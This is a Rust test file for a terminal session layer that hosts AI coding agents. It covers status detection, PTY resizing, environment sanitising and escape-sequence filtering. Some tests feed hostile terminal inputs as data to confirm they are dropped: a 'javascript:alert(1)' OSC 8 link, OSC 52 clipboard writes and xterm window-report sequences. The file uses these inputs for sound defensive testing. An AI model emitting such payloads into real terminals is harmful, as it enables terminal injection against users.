// SPDX-FileCopyrightText: 2026 Alexey Zhokhov
// SPDX-License-Identifier: Apache-2.0

//! Tests for `session`.
use super::{
    AgentSpawnSpec, AgentState, EXPLICIT_CAPABILITY_ENV_NAMES, OscPolicy, SESSION_ENV_PASSTHROUGH,
    Session, SessionEvent, SessionSpawnSpec, SessionTerminal, agent_model_args,
    build_agent_command, build_shell_command, child_exit_reason, emit_pty_exit, emit_pty_spawn,
    inject_status_env, isolated_wrapper_args, osc8_uri_is_safe, pty_exit_error_type,
    pty_exit_reason, validate_spawn_token_syntax,
};

/// Primary-layout spawn spec for `agent`/`instance`.
fn spawn_spec<'a>(
    agent: &'a str,
    instance: &'a str,
    auth_mode: Option<&'a str>,
    env_passthrough: &'a [(String, String)],
) -> AgentSpawnSpec<'a> {
    let (home_dir, forwarded_dir) = match agent {
        "claude" => (
            jackin_core::container_paths::CLAUDE_CONFIG_DIR,
            "/jackin/claude",
        ),
        "codex" => ("/home/agent/.codex", "/jackin/codex"),
        _ => ("/home/agent/.test", "/jackin/test"),
    };
    AgentSpawnSpec {
        agent,
        instance,
        home_dir,
        forwarded_dir,
        model: None,
        effort: None,
        auth_mode,
        env_passthrough,
        cwd: Path::new("/workspace"),
        codename: "test",
        identity: jackin_protocol::SessionIdentity {
            uid: 2_000,
            gid: 2_000,
        },
    }
}

use std::path::Path;
use std::sync::{Arc, Mutex};

use crate::agent_status::evidence::{AuthorityEvidence, AuthorityGrade, RawAgentState};
use crate::agent_status::process::{
    ForegroundGroup, ProcessCpuSample, ProcessInfo, ProcessSampler,
};
use crate::agent_status::rules::{RulePack, RulePackRegistry};
use anyhow::Result;
use jackin_core::Agent;
use jackin_protocol::agent_status::{AgentStatusConfidence, AgentStatusSource};
use portable_pty::{ChildKiller, CommandBuilder, MasterPty, PtySize};
use tokio::sync::mpsc;

// ── PTY test doubles ───────────────────────────────────────────────────────
// Sessions need a master PTY and a child killer; these no-op doubles let a
// test feed synthetic PTY output through `feed_pty` without spawning a child.

#[derive(Debug)]
struct NullChildKiller;

impl ChildKiller for NullChildKiller {
    fn kill(&mut self) -> std::io::Result<()> {
        Ok(())
    }
    fn clone_killer(&self) -> Box<dyn ChildKiller + Send + Sync> {
        Box::new(Self)
    }
}

struct NullMasterPty;

impl MasterPty for NullMasterPty {
    fn resize(&self, _size: PtySize) -> Result<()> {
        Ok(())
    }
    fn get_size(&self) -> Result<PtySize> {
        Ok(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })
    }
    fn try_clone_reader(&self) -> Result<Box<dyn std::io::Read + Send>> {
        Ok(Box::new(std::io::empty()))
    }
    fn take_writer(&self) -> Result<Box<dyn std::io::Write + Send>> {
        Ok(Box::new(std::io::sink()))
    }
    #[cfg(unix)]
    fn process_group_leader(&self) -> Option<libc::pid_t> {
        None
    }
    #[cfg(unix)]
    fn as_raw_fd(&self) -> Option<portable_pty::unix::RawFd> {
        None
    }
    #[cfg(unix)]
    fn tty_name(&self) -> Option<std::path::PathBuf> {
        None
    }
}

/// Master PTY double that records the last `PtySize` handed to `resize`, so a
/// test can assert what `TIOCSWINSZ` the agent's PTY actually received. Only
/// `resize` differs from the inert double; the other (external-trait) methods
/// delegate to an inner `NullMasterPty` rather than re-stubbing them.
struct RecordingMasterPty {
    inner: NullMasterPty,
    last_size: Arc<Mutex<Option<PtySize>>>,
}

impl MasterPty for RecordingMasterPty {
    fn resize(&self, size: PtySize) -> Result<()> {
        if let Ok(mut slot) = self.last_size.lock() {
            *slot = Some(size);
        }
        Ok(())
    }
    fn get_size(&self) -> Result<PtySize> {
        self.inner.get_size()
    }
    fn try_clone_reader(&self) -> Result<Box<dyn std::io::Read + Send>> {
        self.inner.try_clone_reader()
    }
    fn take_writer(&self) -> Result<Box<dyn std::io::Write + Send>> {
        self.inner.take_writer()
    }
    #[cfg(unix)]
    fn process_group_leader(&self) -> Option<libc::pid_t> {
        self.inner.process_group_leader()
    }
    #[cfg(unix)]
    fn as_raw_fd(&self) -> Option<portable_pty::unix::RawFd> {
        self.inner.as_raw_fd()
    }
    #[cfg(unix)]
    fn tty_name(&self) -> Option<std::path::PathBuf> {
        self.inner.tty_name()
    }
}

fn test_session_with_policy(policy: OscPolicy) -> Session {
    let (input_tx, _input_rx) = mpsc::unbounded_channel();
    let mut session = Session::new_for_test(
        "Test".to_owned(),
        Some("codex".to_owned()),
        None,
        (24, 80),
        100,
        input_tx,
        Arc::new(Mutex::new(Box::new(NullMasterPty))),
        Arc::new(Mutex::new(Box::new(NullChildKiller))),
    );
    session.osc_policy = policy;
    session
}

#[test]
fn effective_state_flaps_count_once_per_rolling_window_episode() {
    let mut session = test_session_with_policy(OscPolicy::default());
    let started = std::time::Instant::now();
    assert!(!session.record_status_transition(started));
    assert!(!session.record_status_transition(started + std::time::Duration::from_secs(10)));
    assert!(session.record_status_transition(started + std::time::Duration::from_secs(20)));
    assert!(!session.record_status_transition(started + std::time::Duration::from_secs(25)));

    assert!(!session.record_status_transition(started + std::time::Duration::from_secs(61)));
    assert!(!session.record_status_transition(started + std::time::Duration::from_secs(70)));
    assert!(session.record_status_transition(started + std::time::Duration::from_secs(80)));
}

fn test_process_info(pid: u32, agent: Agent) -> ProcessInfo {
    ProcessInfo {
        pid,
        pgid: pid,
        tpgid: i32::try_from(pid).unwrap(),
        cmdline: vec![agent.slug().to_owned()],
        exe_path: Some(std::path::PathBuf::from(format!(
            "/usr/local/bin/{}",
            agent.slug()
        ))),
        comm: agent.slug().to_owned(),
    }
}

#[derive(Debug)]
struct StaticProcessSampler {
    physics_available: bool,
    root: Option<ProcessInfo>,
    foreground: ForegroundGroup,
    descendants: u32,
    cpu_delta: u64,
}

impl StaticProcessSampler {
    fn foreground_agent(pid: u32, agent: Agent) -> Self {
        Self {
            physics_available: true,
            root: Some(test_process_info(pid, agent)),
            foreground: ForegroundGroup::Agent { agent, pgid: pid },
            descendants: 0,
            cpu_delta: 0,
        }
    }
}

impl ProcessSampler for StaticProcessSampler {
    fn physics_available(&self) -> bool {
        self.physics_available
    }

    fn read_process_info(&self, _pid: u32) -> Option<ProcessInfo> {
        self.root.clone()
    }

    fn foreground_group(&self, _root_info: &ProcessInfo) -> ForegroundGroup {
        self.foreground
    }

    fn descendant_process_count(&self, _root_pid: u32) -> u32 {
        self.descendants
    }

    fn sample_cpu_jiffies_delta(
        &mut self,
        _pid: u32,
        _previous: &mut Option<ProcessCpuSample>,
        _now: std::time::Instant,
    ) -> u64 {
        self.cpu_delta
    }
}

fn status_test_registry() -> RulePackRegistry {
    let pack = toml::from_str::<RulePack>(
        "schema_version = 1\n\
         agent = \"codex\"\n\
         validated_versions = \">=1.0.0, <2.0.0\"\n\
         [[rule]]\n\
         id = \"blocked-test\"\n\
         state = \"blocked\"\n\
         priority = 100\n\
         strength = \"strong\"\n\
         region = \"bottom:24\"\n\
         requires_any = [\"approve?\"]\n\
         [[rule]]\n\
         id = \"idle-test\"\n\
         state = \"idle\"\n\
         priority = 90\n\
         strength = \"strong\"\n\
         region = \"bottom:24\"\n\
         requires_any = [\"ready\"]\n",
    )
    .unwrap()
    .finalize()
    .unwrap();
    RulePackRegistry::from_packs([pack])
}

#[test]
fn advance_status_publishes_screen_blocked_through_full_tick() {
    let now = std::time::Instant::now();
    let mut session = test_session_with_policy(OscPolicy::default());
    session.child_pid = Some(42);
    session.feed_pty(b"approve?");
    let registry = status_test_registry();
    let mut sampler = StaticProcessSampler::foreground_agent(42, Agent::Codex);
    let rows = session.visible_screen_rows();
    assert!(rows.iter().any(|row| row.contains("approve?")));
    assert!(registry.evaluate(session.agent.as_deref(), &rows).is_some());

    let tick = session.advance_status_with_process_sampler(Some(&registry), &mut sampler, now);

    assert_eq!(session.state, AgentState::Blocked);
    assert_eq!(
        tick.transition
            .as_ref()
            .map(|transition| transition.effective),
        Some(AgentState::Blocked)
    );
    let report = session.status.report(session.agent.clone());
    assert_eq!(report.raw_state, RawAgentState::Blocked);
    assert_eq!(report.source, AgentStatusSource::VisibleScreen);
    assert!(report.visible_blocker);
}

#[test]
fn process_sampler_double_drives_process_evidence_on_any_host() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.child_pid = Some(42);
    let mut sampler = StaticProcessSampler::foreground_agent(42, Agent::Codex);
    sampler.descendants = 2;
    sampler.cpu_delta = 7;

    let evidence = session.sample_process_evidence_with(&mut sampler, std::time::Instant::now());

    assert!(evidence.physics_sampled);
    assert!(evidence.child_alive);
    assert!(evidence.root_is_agent);
    assert!(evidence.foreground_is_agent);
    assert_eq!(evidence.foreground_pgid, Some(42));
    assert_eq!(evidence.child_process_count, 2);
    assert_eq!(evidence.cpu_jiffies_delta, 7);
}

#[test]
fn advance_status_publishes_screen_idle_as_done_when_unseen() {
    let now = std::time::Instant::now();
    let mut session = test_session_with_policy(OscPolicy::default());
    session.child_pid = Some(42);
    session.state = AgentState::Working;
    session.status.effective = AgentState::Working;
    session.status.raw = RawAgentState::Working;
    session.status.confidence = AgentStatusConfidence::Strong;
    session.status.seen = false;
    session.feed_pty(b"ready");
    let registry = status_test_registry();
    let mut sampler = StaticProcessSampler::foreground_agent(42, Agent::Codex);
    let rows = session.visible_screen_rows();
    assert!(rows.iter().any(|row| row.contains("ready")));
    assert!(registry.evaluate(session.agent.as_deref(), &rows).is_some());

    let tick = session.advance_status_with_process_sampler(Some(&registry), &mut sampler, now);

    assert_eq!(session.state, AgentState::Done);
    assert_eq!(
        tick.transition
            .as_ref()
            .map(|transition| transition.effective),
        Some(AgentState::Done)
    );
    let report = session.status.report(session.agent.clone());
    assert_eq!(report.raw_state, RawAgentState::Idle);
    assert_eq!(report.source, AgentStatusSource::VisibleScreen);
    assert!(report.visible_idle);
}

#[test]
fn advance_status_publishes_fresh_authority_with_injected_foreground_identity() {
    let now = std::time::Instant::now();
    let mut session = test_session_with_policy(OscPolicy::default());
    session.child_pid = Some(42);
    session.authority = Some(AuthorityEvidence {
        source_id: "opencode-plugin".to_owned(),
        grade: AuthorityGrade::Complete,
        mapped_state: RawAgentState::Working,
        pending_permission: false,
        last_event: now,
        notes: Vec::new(),
    });
    let mut sampler = StaticProcessSampler::foreground_agent(42, Agent::Codex);

    let tick = session.advance_status_with_process_sampler(None, &mut sampler, now);

    assert_eq!(session.state, AgentState::Working);
    assert_eq!(
        tick.transition
            .as_ref()
            .map(|transition| transition.effective),
        Some(AgentState::Working)
    );
    let report = session.status.report(session.agent.clone());
    assert_eq!(report.raw_state, RawAgentState::Working);
    assert_eq!(
        report.source,
        AgentStatusSource::Reported {
            source_id: "opencode-plugin".to_owned()
        }
    );
}

#[test]
fn advance_status_does_not_publish_working_from_helper_physics_alone() {
    let now = std::time::Instant::now();
    let mut session = test_session_with_policy(OscPolicy::default());
    session.child_pid = Some(42);
    let mut sampler = StaticProcessSampler::foreground_agent(42, Agent::Codex);
    sampler.descendants = 1;
    sampler.cpu_delta = 1;

    let tick = session.advance_status_with_process_sampler(None, &mut sampler, now);

    assert_eq!(session.state, AgentState::Unknown);
    assert!(tick.transition.is_none());
    let report = session.status.report(session.agent.clone());
    assert_eq!(report.raw_state, RawAgentState::Unknown);
    assert_eq!(report.source, AgentStatusSource::None);
}

#[test]
fn advance_status_publishes_unknown_when_no_evidence_matches() {
    let now = std::time::Instant::now();
    let mut session = test_session_with_policy(OscPolicy::default());
    session.child_pid = Some(42);
    session.state = AgentState::Working;
    session.status.effective = AgentState::Working;
    session.status.raw = RawAgentState::Working;
    session.status.confidence = AgentStatusConfidence::Strong;
    let mut sampler = StaticProcessSampler::foreground_agent(42, Agent::Codex);

    let tick = session.advance_status_with_process_sampler(None, &mut sampler, now);

    assert_eq!(session.state, AgentState::Unknown);
    assert_eq!(
        tick.transition
            .as_ref()
            .map(|transition| transition.effective),
        Some(AgentState::Unknown)
    );
    let report = session.status.report(session.agent.clone());
    assert_eq!(report.raw_state, RawAgentState::Unknown);
    assert_eq!(report.source, AgentStatusSource::None);
}

#[test]
fn resize_floors_pty_winsize_to_at_least_one() {
    // A collapsed pane can hand `Session::resize` a 0-row (or 0-col) geometry.
    // The agent PTY must never receive a 0×0 `TIOCSWINSZ` — programs expect
    // ≥1 — and each axis must floor independently, not collapse to 1×1.
    let last_size = Arc::new(Mutex::new(None));
    let (input_tx, _input_rx) = mpsc::unbounded_channel();
    let mut session = Session::new_for_test(
        "Test".to_owned(),
        Some("codex".to_owned()),
        None,
        (24, 80),
        100,
        input_tx,
        Arc::new(Mutex::new(Box::new(RecordingMasterPty {
            inner: NullMasterPty,
            last_size: Arc::clone(&last_size),
        }))),
        Arc::new(Mutex::new(Box::new(NullChildKiller))),
    );

    let recorded = || {
        last_size
            .lock()
            .ok()
            .and_then(|slot| *slot)
            .expect("resize must drive the PTY")
    };

    session.resize(0, 80);
    let size = recorded();
    assert_eq!(
        (size.rows, size.cols),
        (1, 80),
        "0 rows floored to 1, cols kept"
    );

    session.resize(24, 0);
    let size = recorded();
    assert_eq!(
        (size.rows, size.cols),
        (24, 1),
        "0 cols floored to 1, rows kept"
    );
}

#[test]
fn feed_pty_does_not_accumulate_scroll_ops() {
    // feed_pty clears recorded scroll ops each chunk so they cannot grow
    // unbounded while the scroll-region optimizer that would consume them is
    // deferred.
    let mut burst = Vec::new();
    for i in 0..200 {
        burst.extend_from_slice(format!("line {i}\r\n").as_bytes());
    }
    // Guard against a vacuous pass: confirm the burst genuinely records scroll
    // ops, so the clear assertion below would fail if recording ever stopped or
    // the clear ran before process().
    let mut probe = termpane::DamageGrid::new(24, 80, 100);
    probe.process(&burst);
    assert!(
        !probe.drain_scroll_ops().is_empty(),
        "burst must record scroll ops for the clear assertion to be meaningful"
    );
    // feed_pty runs the same process() then clear_scroll_ops(); after it
    // returns the buffer must already be empty.
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(&burst);
    assert!(
        session.shadow_grid.drain_scroll_ops().is_empty(),
        "feed_pty must clear recorded scroll ops each chunk"
    );
}

/// Feed `bytes` through a default-policy session and return the
/// forwardable passthrough byte sequences (post-policy filter).
fn drained(bytes: &[u8]) -> Vec<Vec<u8>> {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(bytes);
    session.drain_passthrough()
}

fn drained_with_policy(bytes: &[u8], policy: OscPolicy) -> Vec<Vec<u8>> {
    let mut session = test_session_with_policy(policy);
    session.feed_pty(bytes);
    session.drain_passthrough()
}

// ── OSC and unhandled-CSI passthrough contracts ───────────────────────────
// Every OSC the agent emits must reach the attached client when (and only
// when) the focused-pane policy allows it. The grid emits typed events; the
// session applies `OscPolicy` and re-encodes the forwardable bytes.

#[test]
fn osc_52_clipboard_write_is_re_emitted_when_policy_allows() {
    let drained = drained_with_policy(b"\x1b]52;c;SGVsbG8=\x07", OscPolicy::for_test_allow_all());
    assert_eq!(drained.len(), 1);
    let s = &drained[0];
    assert!(s.starts_with(b"\x1b]52;"));
    assert!(s.windows(8).any(|w| w == b"SGVsbG8="));
}

#[test]
fn osc_2_window_title_is_re_emitted_and_captured() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]2;Claude (working)\x07");
    assert_eq!(
        session.title(),
        Some("Claude (working)"),
        "title not captured"
    );
    let drained = session.drain_passthrough();
    assert_eq!(drained.len(), 1);
    assert!(drained[0].starts_with(b"\x1b]0;") || drained[0].starts_with(b"\x1b]2;"));
}

#[test]
fn osc_8_hyperlink_is_modeled_not_re_emitted() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]8;;https://example/\x07text\x1b]8;;\x07");
    let drained = session.drain_passthrough();
    assert!(
        drained.is_empty(),
        "OSC 8 must not be raw passthrough: {drained:?}"
    );
    let snap = session.shadow_grid.dump();
    assert_eq!(
        snap.cell(0, 0)
            .and_then(|cell| cell.hyperlink_uri.as_deref()),
        Some("https://example/")
    );
    assert_eq!(
        snap.cell(0, 4)
            .and_then(|cell| cell.hyperlink_uri.as_deref()),
        None
    );
}

#[test]
fn osc_9_notification_is_re_emitted() {
    let drained = drained(b"\x1b]9;build finished\x07");
    assert_eq!(drained.len(), 1);
    let s = String::from_utf8_lossy(&drained[0]);
    assert!(s.contains("9;build finished"));
}

#[test]
fn osc_7_cwd_is_captured_and_percent_decoded() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]7;file://localhost/Users/alice/My%20Code\x07");
    assert_eq!(
        session.cwd(),
        Some("/Users/alice/My Code"),
        "OSC 7 must percent-decode and strip the host"
    );
    // OSC 7 must NEVER be forwarded to the outer terminal.
    assert!(
        session.drain_passthrough().is_empty(),
        "OSC 7 must not reach the outer terminal"
    );
}

#[test]
fn osc_7_rejects_malformed_payload() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b]7;random-text\x07");
    assert!(session.cwd().is_none());
}

#[test]
fn kitty_kb_stack_tracks_push_and_pop() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b[>1u\x1b[>3u");
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 3);
    session.feed_pty(b"\x1b[<1u");
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 1);
    session.feed_pty(b"\x1b[<5u"); // over-pop bounded by stack length
    assert_eq!(session.shadow_grid.kitty_kb_flags(), 0);
}

#[test]
fn focus_events_flag_tracks_dec_1004() {
    let mut session = test_session_with_policy(OscPolicy::default());
    session.feed_pty(b"\x1b[?1004h");
    assert!(session.focus_events_enabled());
    session.feed_pty(b"\x1b[?1004l");
    assert!(!session.focus_events_enabled());
}

#[test]
fn title_and_cwd_updates_track_latest_values() {
    // Derived rendering: chrome state is read fresh every frame, so the
    // session only retains the latest title/cwd — no dirty flag.
    let mut session = test_session_with_policy(OscPolicy::default());
    assert!(session.title().is_none());

    session.feed_pty(b"\x1b]2;prompt title\x07");
    assert_eq!(session.title(), Some("prompt title"));

    session.feed_pty(b"\x1b]7;file:///workspace/project\x07");
    assert_eq!(session.cwd(), Some("/workspace/project"));
}

#[test]
fn unhandled_csi_kitty_keyboard_push_is_forwarded() {
    // The grid emits the canonical push bytes; the session forwards them
    // verbatim while tracking the stack for focus-swap restore.
    let drained = drained(b"\x1b[>1u");
    assert!(
        drained.iter().any(|f| f == b"\x1b[>1u"),
        "kitty push must reach the outer terminal: {drained:?}"
    );
}

#[test]
fn unhandled_csi_xterm_window_reports_are_suppressed() {
    // `CSI ... t` is xterm's window manipulation / reporting family;
    // forwarding it lets the host terminal's reply land in a shell pane.
    let drained = drained(b"\x1b[18t\x1b[14t\x1b[16t\x1b[8;40;135t");
    assert!(
        drained.iter().all(|f| !f.ends_with(b"t")),
        "xterm window reports must not reach the outer terminal: {drained:?}"
    );
}

#[test]
fn unhandled_csi_modify_other_keys_is_re_emitted() {
    let drained = drained(b"\x1b[>4;2m");
    assert!(
        drained.iter().any(|f| f == b"\x1b[>4;2m"),
        "drained: {drained:?}"
    );
}

#[test]
fn agent_synchronized_output_toggles_are_absorbed() {
    // The capsule's own frame brackets supersede the agent's BSU/ESU; a
    // forwarded `?2026h` whose matching `l` is dropped froze the outer
    // terminal (D6), so the grid absorbs both toggles.
    for toggle in [&b"\x1b[?2026h"[..], &b"\x1b[?2026l"[..]] {
        let drained = drained(toggle);
        assert!(
            drained.is_empty(),
            "agent ?2026 toggles must never reach the outer terminal: {drained:?}"
        );
    }
}

#[test]
fn known_csi_does_not_double_emit() {
    // Cursor positioning `\x1b[5;3H` is handled by the grid; it must not be
    // re-emitted as passthrough (which would duplicate the cursor move).
    let drained = drained(b"\x1b[5;3H");
    assert!(
        drained.iter().all(|f| !f.ends_with(b"H")),
        "grid-handled CSI leaked through: {drained:?}"
    );
}

#[test]
fn drain_returns_empty_when_no_passthrough_emitted() {
    let drained = drained(b"plain text without any escape sequences");
    assert!(drained.is_empty());
}

#[test]
fn osc_52_clipboard_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]52;c;SGVsbG8=\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 52 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_9_notification_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]9;build finished\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 9 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_2_title_dropped_when_policy_denies() {
    let drained = drained_with_policy(b"\x1b]2;rogue title\x07", OscPolicy::for_test_deny_all());
    assert!(
        drained.is_empty(),
        "OSC 2 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_8_hyperlink_dropped_when_policy_denies() {
    let drained = drained_with_policy(
        b"\x1b]8;;https://example/\x07text\x1b]8;;\x07",
        OscPolicy::for_test_deny_all(),
    );
    assert!(
        drained.is_empty(),
        "OSC 8 leaked under deny policy: {drained:?}"
    );
}

#[test]
fn osc_8_unsafe_scheme_dropped_even_when_policy_allows() {
    // A `javascript:` URI must never reach the host terminal regardless of
    // the operator's hyperlink policy.
    let drained = drained(b"\x1b]8;;javascript:alert(1)\x07");
    assert!(
        drained
            .iter()
            .all(|f| !f.windows(b"javascript".len()).any(|w| w == b"javascript")),
        "unsafe OSC 8 scheme leaked: {drained:?}"
    );
}

#[test]
fn drain_clears_pending_between_calls() {
    let mut session = test_session_with_policy(OscPolicy::for_test_allow_all());
    session.feed_pty(b"\x1b]52;c;AAAA\x07");
    let first = session.drain_passthrough();
    assert_eq!(first.len(), 1);
    let second = session.drain_passthrough();
    assert!(
        second.is_empty(),
        "drain must clear pending; got {second:?}"
    );
}

#[test]
fn build_agent_command_overrides_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_owned(), "claude".to_owned())];
    let cmd = build_agent_command(&spawn_spec("codex", "codex-work", None, &env));

    assert_eq!(
        cmd.get_env("JACKIN_AGENT").and_then(|value| value.to_str()),
        Some("codex")
    );
}

#[test]
fn amp_command_exports_xdg_data_home_as_durable_parent() {
    let empty: Vec<(String, String)> = Vec::new();
    let spec = AgentSpawnSpec {
        agent: "amp",
        instance: "amp",
        home_dir: "/home/agent/.local/share",
        forwarded_dir: "/jackin/amp",
        model: None,
        effort: None,
        auth_mode: Some("sync"),
        env_passthrough: &empty,
        cwd: Path::new("/workspace"),
        codename: "test",
        identity: jackin_protocol::SessionIdentity {
            uid: 2_000,
            gid: 2_000,
        },
    };
    let command = build_agent_command(&spec);

    assert_eq!(
        command
            .get_env("XDG_DATA_HOME")
            .and_then(|value| value.to_str()),
        Some("/home/agent/.local/share")
    );
}

#[test]
fn agent_and_shell_children_require_explicit_github_capability() {
    let inherited = EXPLICIT_CAPABILITY_ENV_NAMES
        .iter()
        .map(|name| ((*name).to_owned(), "ambient-secret".to_owned()))
        .collect::<Vec<_>>();
    let agent = build_agent_command(&spawn_spec("codex", "codex-work", None, &inherited));
    let shell = build_shell_command(
        &inherited,
        Path::new("/workspace"),
        "test",
        jackin_protocol::SessionIdentity {
            uid: 2_000,
            gid: 2_000,
        },
    );

    for name in EXPLICIT_CAPABILITY_ENV_NAMES {
        assert!(agent.get_env(name).is_none(), "agent inherited {name}");
        assert!(shell.get_env(name).is_none(), "shell inherited {name}");
        assert!(
            !SESSION_ENV_PASSTHROUGH.contains(name),
            "ambient capability {name} is still in the session allowlist"
        );
    }
}

#[test]
fn isolated_wrapper_carries_instance_identity_into_session_exec() {
    let args = isolated_wrapper_args(
        jackin_protocol::SessionIdentity {
            uid: 2_017,
            gid: 2_017,
        },
        Some("claude-personal"),
        "/jackin/runtime/entrypoint.sh",
    );
    let args = args
        .iter()
        .map(|arg| arg.to_string_lossy().into_owned())
        .collect::<Vec<_>>();
    assert_eq!(
        args,
        vec![
            "__isolated-exec",
            "claude-personal",
            "2017",
            "2017",
            "/jackin/runtime/entrypoint.sh",
        ]
    );
}

#[test]
fn build_agent_command_injects_only_bounded_auth_mode() {
    let env = vec![(
        jackin_protocol::AUTH_MODE_ENV.to_owned(),
        "private-stale-mode".to_owned(),
    )];
    let cmd = build_agent_command(&spawn_spec("codex", "codex-work", Some("api_key"), &env));

    assert_eq!(
        cmd.get_env(jackin_protocol::AUTH_MODE_ENV)
            .and_then(|value| value.to_str()),
        Some("api_key")
    );
}

#[test]
fn build_agent_command_uses_stable_pane_term() {
    let env = vec![("TERM".to_owned(), "xterm-ghostty".to_owned())];
    let cmd = build_agent_command(&spawn_spec("codex", "codex-work", None, &env));

    assert_eq!(
        cmd.get_env("TERM").and_then(|value| value.to_str()),
        Some("xterm-256color")
    );
}

#[test]
fn build_agent_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_owned(), "24bit".to_owned())];
    let cmd = build_agent_command(&spawn_spec("claude", "claude-work", None, &env));

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn build_shell_command_advertises_truecolor() {
    let env = vec![("COLORTERM".to_owned(), "false".to_owned())];
    let cmd = build_shell_command(
        &env,
        Path::new("/workspace"),
        "test",
        jackin_protocol::SessionIdentity {
            uid: 2_000,
            gid: 2_000,
        },
    );

    assert_eq!(
        cmd.get_env("COLORTERM").and_then(|value| value.to_str()),
        Some("truecolor")
    );
}

#[test]
fn agent_model_args_match_cli_contracts() {
    assert_eq!(
        agent_model_args("claude", Some("sonnet")),
        vec!["--model", "sonnet"]
    );
    assert_eq!(
        agent_model_args("codex", Some("gpt-5")),
        vec!["-m", "gpt-5"]
    );
    assert_eq!(
        agent_model_args("kimi", Some("kimi-k2")),
        vec!["--model", "kimi-k2"]
    );
    assert_eq!(
        agent_model_args("omp", Some("openrouter/sonnet")),
        vec!["--model", "openrouter/sonnet"]
    );
    assert_eq!(
        agent_model_args("hermes", Some("openrouter/sonnet")),
        vec!["--model", "openrouter/sonnet"]
    );
    assert_eq!(
        agent_model_args("opencode", Some("zai/glm")),
        vec!["-m", "zai/glm"]
    );
    assert_eq!(
        agent_model_args("grok", Some("grok-build-0.1")),
        vec!["-m", "grok-build-0.1"]
    );
    assert!(agent_model_args("amp", None).is_empty());
    assert!(agent_model_args("amp", Some("ignored")).is_empty());
}

#[test]
fn build_shell_command_removes_stale_agent_env() {
    let env = vec![("JACKIN_AGENT".to_owned(), "claude".to_owned())];
    let cmd = build_shell_command(
        &env,
        Path::new("/workspace"),
        "test",
        jackin_protocol::SessionIdentity {
            uid: 2_000,
            gid: 2_000,
        },
    );

    assert!(cmd.get_env("JACKIN_AGENT").is_none());
}

#[test]
fn build_shell_command_restores_container_home_and_rejects_foreign_home() {
    let env = vec![("HOME".to_owned(), "/foreign-home".to_owned())];
    let cmd = build_shell_command(
        &env,
        Path::new("/workspace"),
        "test",
        jackin_protocol::SessionIdentity {
            uid: 2_000,
            gid: 2_000,
        },
    );

    let daemon_home = std::env::var("HOME").ok();
    assert_eq!(
        cmd.get_env("HOME").and_then(|value| value.to_str()),
        daemon_home.as_deref(),
        "shell keeps the daemon's container HOME, never a passthrough value"
    );
}

#[test]
fn pty_output_does_not_change_state() {
    // The old flap engine flipped state on every PTY byte (Idle→Working) and
    // could not hold a blocked dialog through its own repaint. After Phase 2,
    // PTY output updates recency only and never authors state.
    let mut session = test_session_with_policy(OscPolicy::default());
    session.state = AgentState::Blocked;
    let before = session.last_output_at;
    session.feed_pty(b"\x1b[2K some redrawn dialog frame\r\n");
    assert_eq!(
        session.state,
        AgentState::Blocked,
        "PTY output must not author state"
    );
    assert!(
        session.last_output_at >= before,
        "PTY output still updates recency evidence"
    );
}

#[test]
fn operator_input_does_not_change_state() {
    // A keystroke inside a blocked dialog used to flip Blocked→Working and
    // re-notify. After Phase 2 it updates the input timestamp and reports
    // whether it cleared a latched blocker, but never authors state.
    let mut session = test_session_with_policy(OscPolicy::default());

    session.state = AgentState::Blocked;
    assert!(session.mark_operator_input(), "reports it was blocked");
    assert_eq!(
        session.state,
        AgentState::Blocked,
        "operator input must not author state"
    );

    session.state = AgentState::Done;
    assert!(!session.mark_operator_input());
    assert_eq!(
        session.state,
        AgentState::Done,
        "operator input must not author state"
    );
}

#[test]
fn redraw_soak_produces_zero_state_transitions() {
    // The flap engine produced a Blocked↔Working flip on every redraw frame.
    // Replaying a permission-dialog repaint many times must now yield zero
    // state changes at the session level. (The real single Blocked transition
    // arrives with the Phase 3/8 evidence pipeline; this guards that redraws
    // alone never author state — the regression that motivated this work.)
    let mut session = test_session_with_policy(OscPolicy::default());
    let start = session.state;
    let frame =
        b"\x1b[2K\x1b[1;1H Do you want to proceed?\r\n  1. Yes\r\n  2. No\r\n  esc to cancel\r\n";
    let mut transitions = 0;
    let mut prev = start;
    for _ in 0..150 {
        session.feed_pty(frame);
        if session.state != prev {
            transitions += 1;
            prev = session.state;
        }
    }
    assert_eq!(
        transitions, 0,
        "redraws must not author any state transition"
    );
    assert_eq!(session.state, start);
}

#[test]
fn opencode_event_sets_complete_authority() {
    use crate::agent_status::evidence::{AuthorityGrade, RawAgentState};
    let mut session = test_session_with_policy(OscPolicy::default());
    let now = std::time::Instant::now();
    session.apply_runtime_event("hook-opencode-1", "opencode", "permission.asked", None, now);
    let a = session.authority.as_ref().expect("authority set");
    assert_eq!(a.source_id, "hook-opencode-1");
    assert_eq!(a.mapped_state, RawAgentState::Blocked);
    assert!(a.pending_permission);
    assert_eq!(a.grade, AuthorityGrade::Complete);
}

#[test]
fn claude_event_never_sets_authority() {
    // Decision 0a: Claude/Codex are identity-only; their events never produce
    // a semantic authority — state comes from the screen pack + watchdog.
    let mut session = test_session_with_policy(OscPolicy::default());
    session.apply_runtime_event(
        "hook-claude-1",
        "claude",
        "Stop",
        None,
        std::time::Instant::now(),
    );
    assert!(session.authority.is_none());
}

#[test]
